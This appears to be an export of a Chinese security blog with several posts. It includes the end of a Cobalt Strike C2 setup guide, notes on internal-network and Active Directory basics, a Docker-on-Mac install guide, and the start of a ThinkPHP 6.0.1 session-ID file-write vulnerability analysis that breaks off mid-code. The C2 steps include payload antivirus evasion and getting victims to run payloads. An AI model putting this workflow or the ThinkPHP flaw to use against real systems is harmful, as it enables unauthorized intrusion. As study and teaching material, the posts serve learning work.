title="agent"></a>agent</h3><p>agent<code>的本意为代理。当攻击者通过代码执行，有一个</code>agent<code>运行在目标网络中，就可以对目标网络进行命令与控制。所以</code>agent` 实际上相当于 Beacon payload。</p><h3 id="服务器-Team-Server"><a href="#服务器-Team-Server" class="headerlink" title="服务器(Team Server)"></a>服务器(Team Server)</h3><p>Cobalt Strike的服务器组件。Team Server(TS)是配置和启动Listener的地方</p><ul><li>控制 - Team Server是Cobalt Strike中所有payload的主控制器，与受害者的所有连接<code>bind/reverse</code>都由Team Server管理。</li></ul><h3 id="客户端-Client-GUI"><a href="#客户端-Client-GUI" class="headerlink" title="客户端(Client GUI)"></a>客户端(Client GUI)</h3><p>团队成员使用的图形化界面</p><hr><h2 id="搭建基本的流程"><a href="#搭建基本的流程" class="headerlink" title="搭建基本的流程"></a>搭建基本的流程</h2><ol><li>(可选步骤)选取C2域名</li><li>(可选步骤)扩展Team Server - 选取或自定义一个C2通信配置文件<a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a> 可设置有效的SSL证书等</li><li>(可选步骤)扩展Client功能 - 使用<a href="https://github.com/search?q=Aggressor+Script" target="_blank" rel="noopener">AggressorScripts</a>修改或扩展Cobalt Strike 3.* 的客户端功能</li><li>启动团队服务器Team Server</li><li>Client 登录Team Server</li><li>启动监听器Listener</li><li>生成payload</li><li>(可选步骤)对payload进行免杀 尽量避免杀毒软件报毒</li><li>使用任意途径以实现受害者主机执行payload</li><li>对victim主机所在网络进行后渗透操作</li></ol><p>注：2这个后续可能另外写</p><p>C2通信配置文件 - <a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable C2 profile</a></p><ul><li>定义C2的通信格式，修改CS默认的流量特征，以对抗流量分析</li><li>使用前强烈推荐使用团队服务器上的脚本对配置文件进行本地的单元测试以检查语法<code>./c2lint my.profile</code></li><li>每个Cobalt Strike团队服务器只能加载一个配置文件，如果需要多个配置文件，可以启动多个团队服务器，每个都有自己的配置文件，可从同一个Cobalt Strike客户端连接到这些服务器</li></ul><h2 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h2><h3 id="先启动team-sever"><a href="#先启动team-sever" class="headerlink" title="先启动team sever"></a>先启动team sever</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动Team Server</span><br><span class="line"> # team server 必须以 root 权限运行 以便于监听端口号为0–1023的listener</span><br><span class="line"> # 默认使用50050端口 监听来自团队成员CS Client的连接请求</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如 sudo .&#x2F;teamserver 192.168.0.100 123456</span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><img src="/Users/zy/Library/Application Support/typora-user-images/image-20200304184201215.png" alt="image-20200304184201215" style="zoom:50%;" /><h5 id="启动参数"><a href="#启动参数" class="headerlink" title="启动参数"></a>启动参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 1 - 必填参数&#96;host&#96; 本服务器外网IP&#x2F;域名</span><br><span class="line">- 2 - 必填参数&#96;password&#96; Client GUI连接时需要输入的密码</span><br><span class="line">- 3 - 可选参数&#96;Malleable C2 communication profile&#96; 指定C2通信配置文件 该功能体现了CS的强大扩展性</span><br><span class="line">- 4 - 可选参数&#96;kill date&#96; 指定所有payload的终止日期</span><br></pre></td></tr></table></figure><h3 id="启动Client客户端"><a href="#启动Client客户端" class="headerlink" title="启动Client客户端"></a>启动Client客户端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Cobalt Strike</span><br><span class="line"></span><br><span class="line">## 注意要给可以执行权限</span><br><span class="line">## chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200306102329521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200304183549316.png&quot; alt=&quot;image-20200304183549316&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><h3 id="Client-GUI-图形界面"><a href="#Client-GUI-图形界面" class="headerlink" title="Client GUI 图形界面"></a>Client GUI 图形界面</h3><p>登陆成功</p><p><img src="https://img-blog.csdnimg.cn/20200306102346823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200304184325345.png&quot; alt=&quot;image-20200304184325345&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网基础知识</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网基础知识"><a href="#内网安全学习从入门到入狱-知识-内网基础知识" class="headerlink" title="内网安全学习从入门到入狱-知识-内网基础知识"></a>内网安全学习从入门到入狱-知识-内网基础知识</h1><p>@[toc]</p><h2 id="内网渗透基础"><a href="#内网渗透基础" class="headerlink" title="内网渗透基础"></a>内网渗透基础</h2><ul><li>首先本文章基本上学习笔记</li><li></li></ul><hr><h3 id="基本的名词介绍"><a href="#基本的名词介绍" class="headerlink" title="基本的名词介绍"></a>基本的名词介绍</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><ul><li>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</li><li>工作组简单来说就是计算机在一个局域网中的的一个圈子，这个圈子大家都是平等的，想来就来想走就走，基本上没有什么约束，自我感觉就是一个组织的名称而已没有什么管理功能。</li></ul><hr><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><ul><li><p>域是一个有安全边界的计算机集合,在同一个域中的计算机, <em>计算机域</em>彼此之间已经建立了信任关系,在域内访问其他机器,不再需要被访问机器的许可。</p></li><li><p>和工作组比较，相当于加入了管理功能，有一些身份验证的功能，更加智能和安全</p></li></ul><hr><h4 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h4><ul><li>活动目录（Active Directory，AD）是指域环境中提供目录服务的组件</li><li>活动目录主要提供以下功能。<br> 账号集中管理：所有账号均存储在服务器上，以便对账号进行重置命令/重置密码等。<br> 软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让<br>用户自由选择要安装的软件。<br> 环境集中管理：统一客户端桌面、IE、TCP/IP 协议等的设置。<br> 增强安全性：统一部署杀毒软件和扫毒任务、集中管理用户的计算机权限、统一制订用户<br>密码策略等。可以监控网络，对资料进行统一管理。<br> 更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡<br>等技术对文件服务器进行容灾设定。更可靠，宕机时间更短。</li></ul><hr><h4 id="DC-域控制器（DC）"><a href="#DC-域控制器（DC）" class="headerlink" title="DC 域控制器（DC）"></a>DC 域控制器（DC）</h4><ul><li><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录（AD）的计算机称为域控制器。在第一次安装活动目录时,安装活动目录的那台计算机就成为域控制器,简称“域控”</p></li><li><p>是一个域中的一台类似管理员一台机子，域控制器负责每一台联入的计算机和用户的验证工作，可以控制域中的计算机，鉴别是不是我们域中的机子。</p></li></ul><hr><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区</p></li><li><p>一般情况下DC和DNS是一个服务器</p></li></ul><hr><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><h4 id="DMZ是什么？"><a href="#DMZ是什么？" class="headerlink" title="DMZ是什么？"></a>DMZ是什么？</h4><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”。在安全领域的具体含义是“内外网防火墙之间的区域”。</p><p>俗称非军事化区</p><p>最主要的知识点，访问控制的情况：</p><ol><li>内网可以访问外网：内网用户访问外网，内网的人也是要上网办公的。</li><li>内网可以访问 DMZ：也得管理自己的网站邮箱服务器</li><li>外网不能访问内网</li><li>外网可以访问DMZ：DMZ中的服务器需要为外界提供服务</li><li>DMZ 不能访问内网</li><li>DMZ 不能访问外网，这个也是不一定，有些服务也是需要访问的，所以这个看情况</li></ol><hr><h4 id="域中有哪些电脑？"><a href="#域中有哪些电脑？" class="headerlink" title="域中有哪些电脑？"></a>域中有哪些电脑？</h4><p>域控制器：DC一般是一个或者两个</p><p>成员服务器：域控底下没有按照AD的普通电脑</p><p>客户机：有一些办公的电脑，例如运维的电脑</p><p>独立的服务器：在一个网里面，但是没加入域环境</p><hr><h3 id="域内的权限分类"><a href="#域内的权限分类" class="headerlink" title="域内的权限分类"></a>域内的权限分类</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>单个域里面自己指派屋多个域来访问，就是把我自己本域的资源授权别人，但是只能在本地使用，只有自己是特权</p><p>全林 干 我</p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>Donain Admin是最大全局组</p><p>单域用户访问多域资源（必须是同一个域里面的用户），我就是域管理员。</p><p>本域 干 全林</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组成员来自域森林中任何域的用户</p><p>账户非常适于域森林中的跨域访问</p><p>全林 干 全林</p><hr><h3 id="A-G-DL-P-策略"><a href="#A-G-DL-P-策略" class="headerlink" title="A-G-DL-P 策略"></a>A-G-DL-P 策略</h3><p>常用的策略形式</p><ul><li>A（Account）表示用户账号。</li><li>G（Global Group）表示全局组。</li><li>U（Universal Group）表示通用组。</li><li>DL（Domain Local Group）表示域本地组。</li><li>P（Permission，许可）表示资源权限。</li><li>按照 A-G-DL-P 策略对用户进行组织和管理会更容易</li><li>A-G-DL-P 策略是指，将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本<br>地组分配资源权限。</li></ul><hr><h3 id="常用本地域组的权限"><a href="#常用本地域组的权限" class="headerlink" title="常用本地域组的权限"></a>常用本地域组的权限</h3><p><strong>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，最强组吧。</strong></p><p>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以<br>在本地登录和关闭域控制器。</p><p>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限</p><p><strong>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目</strong><br><strong>录上均默认拥有完整的管理员权限。 我们俗称的域管理员。</strong></p><p><strong>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个</strong><br><strong>域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权</strong></p><p>打印机操作员组（Print Operators）的成员可以管理网络打印机</p><p>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置<br>其权限</p><p>域用户组（Domain Users）是所有域的成员</p><hr>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker基础篇-安装和配置</title>
      <link href="/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="docker基础篇-安装和配置"><a href="#docker基础篇-安装和配置" class="headerlink" title="docker基础篇-安装和配置"></a>docker基础篇-安装和配置</h1><h2 id="mac上官方安装介绍"><a href="#mac上官方安装介绍" class="headerlink" title="mac上官方安装介绍"></a>mac上官方安装介绍</h2><ul><li><a href="https://docs.docker.com/docker-for-mac/install/" target="_blank" rel="noopener">docker官网mac安装</a></li><li>也可以参考这个</li></ul><h2 id="安装教程开始"><a href="#安装教程开始" class="headerlink" title="安装教程开始"></a>安装教程开始</h2><h4 id="第一步下载"><a href="#第一步下载" class="headerlink" title="第一步下载"></a>第一步下载</h4><p><a href="https://hub.docker.com/editions/community/docker-ce-desktop-mac/" target="_blank" rel="noopener">https://hub.docker.com/editions/community/docker-ce-desktop-mac/</a></p><p>Get Docker</p><table><thead><tr><th>Stable</th><th>Edge</th></tr></thead><tbody><tr><td>The Stable version is fully baked and tested, and comes with the latest GA release of Docker.</td><td>The Edge version offers cutting edge features and comes with <a href="https://docs.docker.com/docker-for-mac/faqs/#what-is-an-experimental-feature" target="_blank" rel="noopener">experimental features turned on</a>.</td></tr><tr><td><a href="https://download.docker.com/mac/stable/Docker.dmg" target="_blank" rel="noopener">Get Docker Desktop for Mac (Stable)</a></td><td><a href="https://download.docker.com/mac/edge/Docker.dmg" target="_blank" rel="noopener">Get Docker Desktop for Mac (Edge)</a></td></tr></tbody></table><p>这有两种</p><ol><li>Stable 季度版本</li><li>Edge 月版本</li></ol><p>完成下载docker.dmg</p><h4 id="第二部安装"><a href="#第二部安装" class="headerlink" title="第二部安装"></a>第二部安装</h4><p>双击正常安装</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-hPsWKcCi-1583302649572)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153121173.png)]</p><h4 id="第三部打开docker"><a href="#第三部打开docker" class="headerlink" title="第三部打开docker"></a>第三部打开docker</h4><p>双击图标，成功打开</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-RE3m0rXu-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153428398.png)]</p><h4 id="第四部登陆"><a href="#第四部登陆" class="headerlink" title="第四部登陆"></a>第四部登陆</h4><ul><li>登录dockerId ，开始安装数据</li><li>如果没有id要求注册一个 <a href="https://hub.docker.com/" target="_blank" rel="noopener">点击注册</a></li><li>成功登陆，安装完毕 </li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-pFf43Llq-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153657641.png)]</li></ul><h4 id="第五部检查环境"><a href="#第五部检查环境" class="headerlink" title="第五部检查环境"></a>第五部检查环境</h4><ul><li>docker -v</li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-rLf7Gf9c-1583302649573)(/Users/zy/Library/Application Support/typora-user-images/image-20200228153943668.png)]</li></ul><h4 id="第六部安装Kitematic（可选）"><a href="#第六部安装Kitematic（可选）" class="headerlink" title="第六部安装Kitematic（可选）"></a>第六部安装Kitematic（可选）</h4><ul><li>安装Kitematic</li><li>kitematic是docker推出的GUI工具,使操作docker的方式变得更简单直观。</li></ul><p><a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">https://github.com/docker/kitematic/releases</a></p><p><a href="https://kitematic.com/" target="_blank" rel="noopener">https://kitematic.com</a></p><p>下载<a href="https://github.com/docker/kitematic/releases/download/v0.17.10/Kitematic-0.17.10-Mac.zip" target="_blank" rel="noopener">Kitematic-0.17.10-Mac.zip</a>版本的</p><h2 id="重要的一步-镜像加速"><a href="#重要的一步-镜像加速" class="headerlink" title="重要的一步-镜像加速"></a>重要的一步-镜像加速</h2><p>国内从 DockerHub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：</p><table><thead><tr><th>镜像加速器</th><th>镜像加速器地址</th><th>专属加速</th><th>其它加速</th></tr></thead><tbody><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdocker-cn.com%2Fregistry-mirror" target="_blank" rel="noopener">Docker 中国官方镜像</a></td><td><code>https://registry.docker-cn.com</code></td><td></td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdaocloud.io%2Fmirror" target="_blank" rel="noopener">DaoCloud 镜像站</a></td><td><code>http://f1361db2.m.daocloud.io</code></td><td>可登录，系统分配</td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAzure%2Fcontainer-service-for-azure-china%2Fblob%2Fmaster%2Faks%2FREADME.md%2322-container-registry-proxy" target="_blank" rel="noopener">Azure 中国镜像</a></td><td><code>https://dockerhub.azk8s.cn</code></td><td></td><td>Docker Hub、GCR、Quay</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmirrors.ustc.edu.cn%2Fhelp%2Fdockerhub.html" target="_blank" rel="noopener">科大镜像站</a></td><td><code>https://docker.mirrors.ustc.edu.cn</code></td><td></td><td>Docker Hub、<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fustclug%2Fmirrorrequest%2Fissues%2F91" target="_blank" rel="noopener">GCR</a>、<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fustclug%2Fmirrorrequest%2Fissues%2F135" target="_blank" rel="noopener">Quay</a></td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcr.console.aliyun.com" target="_blank" rel="noopener">阿里云</a></td><td><code>https://.mirror.aliyuncs.com</code></td><td>需登录，系统分配</td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fkirk-enterprise.github.io%2Fhub-docs%2F%23%2Fuser-guide%2Fmirror" target="_blank" rel="noopener">七牛云</a></td><td><code>https://reg-mirror.qiniu.com</code></td><td></td><td>Docker Hub、GCR、Quay</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc.163yun.com%2Fhub" target="_blank" rel="noopener">网易云</a></td><td><code>https://hub-mirror.c.163.com</code></td><td></td><td>Docker Hub</td></tr><tr><td><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcloud.tencent.com%2Fdocument%2Fproduct%2F457%2F9113" target="_blank" rel="noopener">腾讯云</a></td><td><code>https://mirror.ccs.tencentyun.com</code></td><td></td><td>Docker Hub</td></tr></tbody></table><ul><li>对于使用 Mac OS X 的用户</li><li>在任务栏点击 Docker for mac 应用图标-&gt; Perferences…-&gt; Daemon-&gt; Registrymirrors。在列表中填写加速器地址 <strong><a href="https://registry.docker-cn.com" target="_blank" rel="noopener">https://registry.docker-cn.com</a></strong> 。</li><li>修改完成之后，点击 Apply&amp;Restart 按钮，Docker 就会重启并应用配置的镜像地址了。</li><li>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EghncBCs-1583302649574)(/Users/zy/Library/Application Support/typora-user-images/image-20200228162757953.png)]</li></ul>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 6.0.1 漏洞分析（任意文件操作）</title>
      <link href="/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/"/>
      <url>/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p><h4 id="具体受影响版"><a href="#具体受影响版" class="headerlink" title="具体受影响版"></a>具体受影响版</h4><p>ThinkPHP6.0.0-6.0.1。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>/tp60/app/middleware.php 文件开启session</p><p>去掉se注释session的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>tp5/public/index.php  在控制器中加入测试session的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sid =$_POST[<span class="string">'key'</span>];</span><br><span class="line">        session(<span class="string">'zeo'</span>,$sid);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>意思是获取一个key设置写入session中<br>注：使用thinkphp6 最好使用高版本 的php</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。</p><p>漏洞首先出现的地方是  sessionid可控<br>tp6/vendor/topthink/framework/src/think/session/Store.php<br>121行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * session_id设置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $id session_id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span><span class="params">($id = null)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sessionid的设置的时候 为进行效验，只要是32位的就可以</p><p>同一个文件看一下session保存<br>tp6/vendor/topthink/framework/src/think/session/Store.php  254行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 保存session数据</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">       $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">           $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>先获取session id  然后是  <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br>在跟进一下handler<br>只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, SessionHandlerInterface $handler, array $serialize = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name    = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = $handler;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($serialize)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;serialize = $serialize;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setId();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php<br>这里获取到 PHPSESSID 的值  session id传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">          $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 